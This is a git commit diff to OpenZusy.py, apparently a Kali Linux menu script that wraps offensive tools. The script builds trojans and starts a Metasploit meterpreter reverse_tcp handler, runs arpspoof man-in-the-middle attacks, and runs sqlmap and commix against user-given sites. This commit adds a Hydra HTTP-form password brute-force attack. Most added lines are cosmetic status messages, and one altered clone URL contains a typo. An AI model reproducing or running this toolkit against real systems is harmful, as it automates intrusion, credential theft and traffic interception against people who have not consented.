7dc4b4bf1d9804e3126a158133659eafe0e3f1c9
No_Name.exe <153848626+NoNameZusy@users.noreply.github.com>
2024-06-06 22:15:40 +0400

    Update OpenZusy.py

--- OpenZusy.py
+++ OpenZusy.py
@@ -4,6 +4,7 @@ import signal
 from colorama import Fore
 import subprocess
 import threading
+import time
 
 def signal_handler(sig, frame):
     print("")
@@ -25,6 +26,9 @@ def get_kali_ip():
         return None
 
 def create_trojan():
+    time.sleep(0.5)
+    print(Fore.RED + "[Message] " + Fore.WHITE +"Wait Please...")
+    time.sleep(0.5)
     clear_screen()
     print("[0] Back\n")
     print("[1] Android")
@@ -68,12 +72,12 @@ def create_trojan():
                     
     process = run(trojan_command, shell=True)
     if process.returncode == 0:
-        print(f"Trojan created! File directory => {os.getcwd()}/{filedirectory}.{file_extension}")
-        print("Starting Metasploit...")
+        print(Fore.RED + "[Message] " + Fore.WHITE +f"Trojan created! File directory => {os.getcwd()}/{filedirectory}.{file_extension}")
+        print(Fore.BLUE + "[Status] " + Fore.WHITE +"Starting Metasploit...")
         msf_command = f"use exploit/multi/handler; set payload {platform}/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4242; exploit"
         run(f"msfconsole -q -x '{msf_command}'", shell=True)
     else:
-        print("Trojan creation failed.")
+        print(Fore.RED + "[Message] " + Fore.WHITE +"Trojan creation failed.")
         
     input("\nPress Enter to continue...")
     main_menu()
@@ -103,6 +107,9 @@ def ip_tracer():
     main_menu()
 
 def nmap_scan():
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Nmap running...")
+    time.sleep(0.5)
     clear_screen()
     print("[0] Back\n")
     target_ip = input("Target IP: ")
@@ -110,32 +117,32 @@ def nmap_scan():
         main_menu()
         return
     nmap_command = f"nmap -p1-65535 -sV -sS -T4 -A -O {target_ip}"
-    print("Please Wait")
+    print(Fore.RED + "[Message] " + Fore.WHITE +"Please Wait")
     process = run(nmap_command, shell=True)
     if process.stdout is not None:
         print(process.stdout.decode())
     else:
-        print("Nmap scan completed.")
+        print(Fore.RED + "[Message] " + Fore.WHITE +"Nmap scan completed.")
     input("\nPress Enter to go back...")
     main_menu()
 
 def port_scan():
     clear_screen()
     port_scancommand = "python3 portscan.py"
-    print("Please Wait")
+    print(Fore.RED + "[Message] " + Fore.WHITE +"Please Wait")
     process = run(port_scancommand, shell=True)
     if process.stdout is not None:
         print(process.stdout.decode())
     else:
         print("")    
-        print("Port scan completed.")
+        print(Fore.RED + "[Message] " + Fore.WHITE +"Port scan completed.")
     input("\nPress Enter to go back...")
     main_menu() 
 
 def netdiscover():
     clear_screen()
     netdiscover_command = "netdiscover"
-    print("Please Wait")
+    print(Fore.RED + "[Message] " + Fore.WHITE +"Please Wait")
     process = run(netdiscover_command, shell=True)
     if process.stdout is not None:
         print(process.stdout.decode())
@@ -147,34 +154,40 @@ def netdiscover():
     
 
 def sql_scan():
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"SQLMap running...")
+    time.sleep(0.5)
     clear_screen()
     print("[0] Back\n")
     target_ip = input("Target Web Site Link: ")
     if target_ip == "0":
         main_menu()
     nmap_command = f"sqlmap -u {target_ip}"
-    print("Please Wait")
+    print(Fore.RED + "[Message] " + Fore.WHITE +"Please Wait")
     process = run(nmap_command, shell=True)
     if process.stdout is not None:
         print(process.stdout.decode())
     else:
-        print("Scan completed.")
+        print(Fore.RED + "[Message] " + Fore.WHITE +"Scan completed.")
     input("\nPress Enter to go back...")
     main_menu()
 
 def commix_scan():
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Commix running...")
+    time.sleep(0.5)
     clear_screen()
     print("[0] Back\n")
     target_ip = input("Target Web Site Link: ")
     if target_ip == "0":
         main_menu()
     nmap_command = f"commix -u {target_ip}"
-    print("Please Wait")
+    print(Fore.RED + "[Message] " + Fore.WHITE +"Please Wait")
     process = run(nmap_command, shell=True)
     if process.stdout is not None:
         print(process.stdout.decode())
     else:
-        print("Scan completed.")
+        print(Fore.RED + "[Message] " + Fore.WHITE +"Scan completed.")
     input("\nPress Enter to go back...")
     main_menu()
     
@@ -196,27 +209,35 @@ def info():
 
 def open_metasploit():
     clear_screen()
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Metasploit running...\n")
     run("msfconsole -q", shell=True)
 
 def cupp_open():
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Cupp running...")
+    time.sleep(0.5)
     clear_screen()
     process = run("which cupp", shell=True, capture_output=True, text=True)
     if process.returncode == 0:
         print("")
         run("cupp -i", shell=True)
     else:
-        print("Cupp is not installed. Installing...")
+        print(Fore.RED + "[Message] " + Fore.WHITE +"Cupp is not installed. Installing...")
         install_command = "sudo apt install cupp"
         process = run(install_command, shell=True)
         if process.returncode == 0:
-            print("Cupp installed successfully. Opening...")
+            print(Fore.RED + "[Message] " + Fore.WHITE +"Cupp installed successfully. Opening...")
             run("cupp -i", shell=True)
         else:
-            print("Failed to install Cupp.")
+            print(Fore.RED + "[Message] " + Fore.WHITE +"Failed to install Cupp.")
     input("\nPress Enter to go back...")
     main_menu()
 
 def update_kali():
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Upgrading System...")
+    time.sleep(0.5)
     clear_screen()
     run("sudo apt update && sudo apt upgrade -y", shell=True)
 
@@ -232,15 +253,14 @@ def kali_undercover():
 
 def update_tool():
     try:
-        print("Updating tool...")
+        print(Fore.BLUE + "[Status] " + Fore.WHITE +"Updating tool...")
         run("cd .. && rm -rf Zusy && git clone https://github.com/NoNameZusy/Zusy.git && cd Zusy && python3 OpenZusy.py", shell=True)
     except Exception as e:
-        print("Error updating tool:", e)
+        print(Fore.RED + "[Message] " + Fore.WHITE +"Error updating tool:", e)
         main_menu()
         
 def MITM():
     clear_screen()
-    print("\n[0] Back\n")
     wifi_ip = input("Your Wifi IP > ")
     target_ip = input("Target IP > ")
 
@@ -250,28 +270,34 @@ def MITM():
         process1 = subprocess.Popen(f"arpspoof -i eth0 -t {wifi_ip} {target_ip}", shell=True)
         process2 = subprocess.Popen(f"arpspoof -i eth0 -t {target_ip} {wifi_ip}", shell=True)
 
-        print("\nPress ctrl + z to stop the attack.\n")
+        print(Fore.RED + "[Message] " + Fore.WHITE +"\nPress ctrl + z to stop the attack.\n")
         while True:
             stop_command = input().strip().lower()
             if stop_command == 'd':
                 os.kill(process1.pid, signal.SIGTERM)
                 os.kill(process2.pid, signal.SIGTERM)
-                print("Processes terminated.")
+                print(Fore.RED + "[Message] " + Fore.WHITE +"Processes terminated.")
                 break
 
 def reboot_system():
     clear_screen()
     input("Press Enter to continue...")
-    run("sudo reboot", shell=True)
+    run("reboot", shell=True)
 
 def threat_manager():
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"ThreatManager running...")
+    time.sleep(0.5)
     if os.path.isdir("ThreatManager"):
         run("cd .. && cd ThreatManager && python3 OpenThreat.py", shell=True)
     else:
-        run("cd .. && git clone https://github.com/NoNameZusy/ThreatManager.git", shell=True)
+        run("cd .. && git clone https://github.com/NoNatmmeZusy/ThreatManager.git", shell=True)
         run("cd .. && cd ThreatManager && python3 OpenThreat.py", shell=True)
         
 def ZusyFramework():
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"ZusyFramework running...")
+    time.sleep(0.5)
     clear_screen()
     if os.path.isdir("ZusyFramework"):
         run("cd .. && cd ZusyFramework && python3 ZusyFramework.py", shell=True)
@@ -280,6 +306,9 @@ def ZusyFramework():
         run("cd .. && cd ZusyFramework && python3 ZusyFramework.py", shell=True)        
         
 def No_Escape():
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"No_Escape running...")
+    time.sleep(0.5)
     if os.path.isdir("No_Escape"):
         run("cd .. && cd No_Escape && python3 No_Escape.py", shell=True)
     else:
@@ -294,14 +323,44 @@ def wifi_scan():
         print(process.stdout.decode())
     else:
         print("")    
-        print("Wifi scan completed.")
+        print(Fore.RED + "[Message] " + Fore.WHITE +"Wifi scan completed.")
     input("\nPress Enter to go back...")
     main_menu() 
         
 
 def social_engineering():
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Social Engineering Toolkit running...")
+    time.sleep(0.5)
     clear_screen()
     run("setoolkit", shell=True)
+    
+def hydra():
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Hydra running...")
+    time.sleep(0.5)
+    os.system('clear')
+    user_admin_name = input("Username: ")
+    user_password = input("Password: ")
+    website_url = input("Panel URL: ")
+    website_file = input("File Extension (ex. /login/admin.php/): ")
+
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE + "Starting attack...")
+    time.sleep(1)
+    run(f"hydra -l {user_admin_name} -P /root/Desktop/wordlist.txt {website_url} http-post-form '{website_file}:username=^USER^&password=^PASS^&Login=Login:Login failed' -V -I", shell=True)
+
+def bettercap():
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Bettercap running...")
+    time.sleep(0.5)
+    run("bettercap", shell=True)
+
+def wireshark():
+    time.sleep(0.5)
+    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Wireshark running...")
+    run("wireshark", shell=True)
+
 
 def InformationManager():
     if os.path.isdir("InformationManager"):
@@ -320,10 +379,10 @@ def main_menu():
       ╔╝═╚═╣╚═╝║╚═╝║─║║──
       ╚════╩═══╩═══╝─╚╝──
 -------{ By No_Name.exe }-------
-                        v 1.7
+                        v 1.8
     """
     print(logo)
-    print("[1] Nmap Scan\n[2] Open Metasploit\n[3] Social Engineering\n[4] SQL Injection\n[5] Commix\n[6] Restart System\n[7] Become Windows (on/off)\n[8] Upgrade System\n[9] Password Found\n[10] System About\n[11] Create Trojan\n[12] IP-Tracer\n[13] Netdiscover\n[14] ThreatManager\n[15] Port Scan\n[16] InformationManager\n[17] Wifi Scan (eth0)\n[18] No_Escape (BETA)\n[19] MITM Attack\n[20] ZusyFramework (BETA)\n[99] Exit\n"
+    print("[1] Nmap Scan\n[2] Open Metasploit\n[3] Social Engineering\n[4] SQL Injection\n[5] Commix\n[6] Restart System\n[7] Become Windows (on/off)\n[8] Upgrade System\n[9] Password Found\n[10] System About\n[11] Create Trojan\n[12] IP-Tracer\n[13] Netdiscover\n[14] ThreatManager\n[15] Port Scan\n[16] InformationManager\n[17] Wifi Scan (eth0)\n[18] No_Escape (BETA)\n[19] MITM Attack\n[20] ZusyFramework (BETA)\n[21] Hydra\n[22] Bettercap\n[23] Wireshark\n[99] Exit\n"
     "\n[100] Update\n[101] Info\n")
     choice = input("Zusy ~$ ")
     if choice == "1":
@@ -365,7 +424,13 @@ def main_menu():
     elif choice == "19":
         MITM()    
     elif choice == "20":
-    	ZusyFramework()                                     
+    	ZusyFramework()
+    elif choice == "21":
+        hydra() 
+    elif choice == "22":
+        bettercap()
+    elif choice == "23":
+        wireshark()                             
     elif choice == "100":
         update_tool()
     elif choice == "101":
